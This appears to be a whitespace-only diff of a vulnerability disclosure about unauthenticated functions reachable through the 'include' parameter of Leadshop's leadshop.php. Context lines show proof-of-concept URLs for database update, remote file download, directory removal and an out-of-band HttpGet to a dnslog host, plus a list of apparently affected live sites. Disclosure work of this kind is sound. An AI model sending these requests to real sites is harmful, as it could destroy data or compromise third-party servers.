@@ -50,8 +50,7 @@ UpdateSql (perform database update: poc: ```https://demo.leadshop.vip/leadshop.p
 DownloadFile (download file: poc: 
 ```https://demo.leadshop.vip/leadshop.php?include=DownloadFile&meta=www.baidu.com/img/flexible/logo/pc/peak-result.png```),  
 RemoveDir (remove directory: poc: 
-```https://demo.leadshop.vip/leadshop.php?include=RemoveDir&meta=[path]```)
-
+```https://demo.leadshop.vip/leadshop.php?include=RemoveDir&meta=[path]```)  
 -
 Proof of Concept:
 -
@@ -61,8 +60,7 @@ Poc：
 https://demo.leadshop.vip/leadshop.php?include=HttpGet&meta=6nup69.dnslog.cn  
 ```
 DNSLog picture:
-![img](DNSLog.png)
-
+![img](DNSLog.png)  
 -
 Impact
 -
@@ -83,7 +81,6 @@ http://119.3.229.175:7788
 https://101.200.231.65
 https://zhangtong.store.mianhuain.com
 ```
-
 -
 Occurrences
 -
